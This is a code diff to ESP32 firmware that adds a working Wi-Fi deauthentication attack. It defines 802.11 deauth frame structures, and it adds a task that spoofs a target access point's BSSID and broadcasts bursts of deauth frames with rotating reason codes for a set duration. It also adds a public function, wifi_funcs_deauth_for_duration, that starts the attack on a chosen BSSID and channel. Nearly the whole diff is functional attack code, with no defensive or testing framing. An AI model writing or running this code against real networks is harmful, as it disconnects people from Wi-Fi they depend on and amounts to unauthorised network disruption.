@@ -14,6 +14,7 @@
 #include "esp_netif.h"
 #include "esp_err.h"
 #include "esp_sntp.h"
+#include "esp_timer.h"
 #include "esp_ping.h"
 #include "lwip/inet.h"
 #include "lwip/netdb.h"
@@ -43,6 +44,8 @@
 
 #define RAW_HEX_BUF_CAP (AI_CMD_MAX_LEN) // AI_CMD_MAX_LEN PSRAM for hex strings
 
+#define TIMER_GET_TIME_SEC() ((uint32_t)(esp_timer_get_time() / 1000000ULL))
+
 // extern to lcd_wifi_funcs.c
 EXT_RAM_BSS_ATTR char raw_frames_hex_buf[RAW_HEX_BUF_CAP]; // Accumulated hex strings
 size_t raw_frames_hex_len = 0; // Current length
@@ -58,6 +61,30 @@ static char mqtt_active_ack_topic[80] = {0};
 static volatile int32_t ping_avg_ms = -1;
 static esp_ip4_addr_t sta_gw = {0};
 static bool sta_gw_valid = false;
+
+// Deauth attack target structures
+typedef struct {
+    uint8_t bssid[6];
+    char ssid[33];
+    uint8_t channel;
+    uint32_t packets_sent;
+    uint16_t seq_num;
+    uint32_t duration_sec;
+} deauth_target_t;
+
+// 802.11 deauth frame structure
+typedef struct {
+    uint8_t frame_ctrl[2];
+    uint8_t duration[2];
+    uint8_t dest_addr[6];
+    uint8_t src_addr[6];
+    uint8_t ap_bssid[6];
+    uint8_t seq_ctrl[2];
+    uint8_t reason[2];
+} __attribute__((packed)) deauth_frame_t; // Packed to avoid padding bytes
+
+// Global task handle to allow stopping if needed
+static TaskHandle_t deauth_task_handle = NULL;
 
 esp_err_t wifi_funcs_scan(wifi_scan_t *wifi_scan)
 {
@@ -1868,4 +1895,223 @@ esp_err_t wifi_funcs_ping(const char *host, int32_t *rtt_ms)
     freeaddrinfo(res);
 
     return wifi_funcs_ping_ip4(&ip4, rtt_ms);
+}
+
+//       Structure of a typical 802.11 deauthentication frame
+// ┌─────────────────────────────────────────────────────────────────┐
+// │                     MAC Header (24 bytes)                       │
+// ├─────────────────────────────────────────────────────────────────┤
+// │ Frame Control │ Duration │   DA   │   SA   │  BSSID  │ Seq Ctrl │
+// │    2 bytes    │ 2 bytes  │ 6 bytes│ 6 bytes│ 6 bytes │ 2 bytes  │
+// ├─────────────────────────────────────────────────────────────────┤
+// │                     Frame Body (2 bytes)                        │
+// ├─────────────────────────────────────────────────────────────────┤
+// │                        Reason Code                              │
+// │                         2 bytes                                 │
+// ├─────────────────────────────────────────────────────────────────┤
+// │                     FCS (4 bytes) - HW added                    │
+// └─────────────────────────────────────────────────────────────────┘
+static void send_deauth_frames_burst(deauth_target_t *deauth_target, uint32_t burst)
+{
+    static uint16_t reasons[] = {0x0001, 0x0003, 0x0006, 0x0007, 0x0008}; // Common reason codes
+    static uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF}; // Send to all stations
+    
+    // Send burst of 'burst' frames with different reason codes
+    for (uint32_t i = 0; i < burst; ++i) {
+        uint16_t dc_reason = reasons[i % 5];
+    
+        /* Create deauth frame */
+
+        deauth_frame_t frame;
+        memset(&frame, 0, sizeof(frame)); // Zero out frame
+        
+        // Set as a deauth frame
+        frame.frame_ctrl[0] = 0xC0;
+        frame.frame_ctrl[1] = 0x00;
+
+        // Set duration to 0
+        frame.duration[0] = 0x00;
+        frame.duration[1] = 0x00;
+        
+        // Set destination, source, and BSSID addresses
+        memcpy(frame.dest_addr, broadcast_mac, 6);
+        memcpy(frame.src_addr, deauth_target->bssid, 6);
+        memcpy(frame.ap_bssid, deauth_target->bssid, 6);
+        
+        // Set sequence control
+        // Byte 0: [Seq bits 0-3][Frag bits 0-3] ->  upper nibble = seq, lower nibble = frag
+        // Byte 1: [Seq bits 4-11]               ->  remaining 8 bits of sequence
+
+        // Extract lowest 4 bits of sequence number and shift to upper nibble
+        // Sets fragment number to 0
+        frame.seq_ctrl[0] = (deauth_target->seq_num & 0x0F) << 4;
+        // Remaining 8 bits of sequence number
+        frame.seq_ctrl[1] = (deauth_target->seq_num >> 4) & 0xFF;
+        
+        // Set reason code
+        frame.reason[0] = dc_reason & 0xFF; // Lower 8 bits of reason code
+        frame.reason[1] = (dc_reason >> 8) & 0xFF; // Upper 8 bits of reason code
+
+        /* Transmit the frame */
+        esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, &frame, sizeof(frame), false);
+        if (err != ESP_OK) {
+            if (err == ESP_ERR_NO_MEM) {
+                #ifdef POLYCAST5_DEBUG
+                //ESP_LOGW(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx warning (expected): %s", esp_err_to_name(err));
+                #endif
+            } else {
+                ESP_LOGE(TAG, "send_deauth_frames_burst: esp_wifi_80211_tx failed: %s", esp_err_to_name(err));
+            }
+            // Try to send remaining frames
+            continue;
+        } else { // Frame TX successful
+            // Increment seq_num with wrap at 4096 (12-bit sequence number)
+            deauth_target->seq_num = (deauth_target->seq_num + 1) & 0x0FFF;
+
+            // Increment sent counter
+            deauth_target->packets_sent++;
+        }
+    }
+}
+
+static void deauth_send_task(void *pvParameters)
+{
+    // Get passed target params
+    deauth_target_t *deauth_target = (deauth_target_t *)pvParameters;
+
+    // Set initial values
+    uint32_t attack_start_time = TIMER_GET_TIME_SEC(); // Start time
+    #ifdef POLYCAST5_DEBUG
+    uint32_t last_log_time = 0; // Last log time
+    #endif
+    uint32_t cycle_count = 0; // Burst cycle counter
+
+    #ifdef POLYCAST5_DEBUG
+    ESP_LOGI(TAG, "deauth_send_task started on Ch. '%d' for '%lu' sec for BSSID '%02X:%02X:%02X:%02X:%02X:%02X'",
+            deauth_target->channel, deauth_target->duration_sec, 
+            deauth_target->bssid[0], deauth_target->bssid[1], deauth_target->bssid[2],
+            deauth_target->bssid[3], deauth_target->bssid[4], deauth_target->bssid[5]);
+    #endif
+
+    // Set channel
+    esp_wifi_set_channel(deauth_target->channel, WIFI_SECOND_CHAN_NONE);
+
+    while (1) {
+        // Get elapsed time since task started
+        uint32_t time_elapsed = TIMER_GET_TIME_SEC() - attack_start_time;
+
+        // Check if duration expired
+        if (time_elapsed >= deauth_target->duration_sec) {
+            ESP_LOGI(TAG, "deauth_send_task duration expired");
+            break;
+        }
+
+        // Send a burst of deauth frames
+        send_deauth_frames_burst(deauth_target, 10);
+
+        cycle_count++; // Increment burst cycle counter
+
+        #ifdef POLYCAST5_DEBUG
+        // Periodic logging
+        if (time_elapsed - last_log_time >= 1) { // Log every second
+            last_log_time = time_elapsed;
+
+            // Calculate packets per second
+            float packets_per_sec = (float)deauth_target->packets_sent / (float)(time_elapsed > 0 ? time_elapsed : 1);
+
+            // Calculate remaining time
+            uint32_t remaining_sec = deauth_target->duration_sec - time_elapsed;
+
+            ESP_LOGI(TAG, "[%lu/%lu sec] Total: %lu pkt | PPS: %.0f | Cycles: %lu | Remaining: %lu sec",
+                    time_elapsed, deauth_target->duration_sec, deauth_target->packets_sent, packets_per_sec, cycle_count, remaining_sec);
+        }
+        #endif
+
+        // Feed the watchdog
+        vTaskDelay(pdMS_TO_TICKS(10));
+    }
+
+    // Final stats
+    uint32_t total_time = TIMER_GET_TIME_SEC() - attack_start_time;
+    float avg_pps = total_time > 0 ? (float)deauth_target->packets_sent / total_time : 0;
+
+    #ifdef POLYCAST5_DEBUG
+    ESP_LOGI(TAG, "Total packets: %lu", deauth_target->packets_sent);
+    ESP_LOGI(TAG, "Total time: %lu sec", total_time);
+    ESP_LOGI(TAG, "Average PPS: %.0f", avg_pps);
+    #endif
+
+    // Stop Wi-Fi
+    esp_wifi_stop();
+
+    // Clean up allocated param
+    free(deauth_target);
+
+    // Reset global task handle
+    deauth_task_handle = NULL;
+
+    // Delete the task
+    vTaskDelete(NULL);
+}
+
+esp_err_t wifi_funcs_deauth_for_duration(uint32_t duration_sec, const uint8_t *target_bssid, uint8_t channel)
+{
+    // Check for errors
+    if (deauth_task_handle != NULL) {
+        ESP_LOGW(TAG, "wifi_funcs_deauth_for_duration: already running");
+        return ESP_ERR_INVALID_STATE;
+    }
+    if (!target_bssid) {
+        ESP_LOGE(TAG, "wifi_funcs_deauth_for_duration: invalid target_bssid");
+        return ESP_ERR_INVALID_ARG;
+    }
+
+    // Create deauth target struct (allocated so task can free it)
+    deauth_target_t *deauth_target = malloc(sizeof(deauth_target_t));
+    if (!deauth_target) {
+        ESP_LOGE(TAG, "wifi_funcs_deauth_for_duration: malloc failed");
+        return ESP_ERR_NO_MEM;
+    }
+
+    // Populate fields
+    deauth_target->duration_sec = duration_sec;
+    memcpy(deauth_target->bssid, target_bssid, 6);
+    deauth_target->channel = channel;
+    deauth_target->packets_sent = 0;
+    deauth_target->seq_num = esp_random() % 4096; // Random start (0-4095)
+
+    // Setup Wi-Fi in STA mode
+    esp_err_t err = esp_wifi_set_mode(WIFI_MODE_STA);
+    if (err != ESP_OK) {
+        free(deauth_target);
+        return err;
+    }
+
+    // Small delay to ensure mode set
+    vTaskDelay(pdMS_TO_TICKS(250));
+
+    // Start Wi-Fi
+    err = esp_wifi_start();
+    if (err != ESP_OK) {
+        ESP_LOGE(TAG, "wifi_funcs_deauth_for_duration: esp_wifi_start failed: %s", esp_err_to_name(err));
+        // Free on error
+        free(deauth_target);
+        return err;
+    }
+
+    // Create dedicated deauth_send_task
+    BaseType_t ret = xTaskCreate(deauth_send_task, "deauth_task", (1024 * 4), deauth_target, POLYCAST5_PRIORITY_MEDIUM, &deauth_task_handle); // Pass deauth_target as task parameter
+    if (ret != pdPASS) {
+        ESP_LOGE(TAG, "wifi_funcs_deauth_for_duration: Failed to create deauth_send_task");
+        // Free on error
+        free(deauth_target);
+        esp_wifi_stop();
+        return ESP_FAIL;
+    }
+
+    #ifdef POLYCAST5_DEBUG
+    ESP_LOGI(TAG, "deauth_send_task started");
+    #endif
+
+    return ESP_OK;
 }
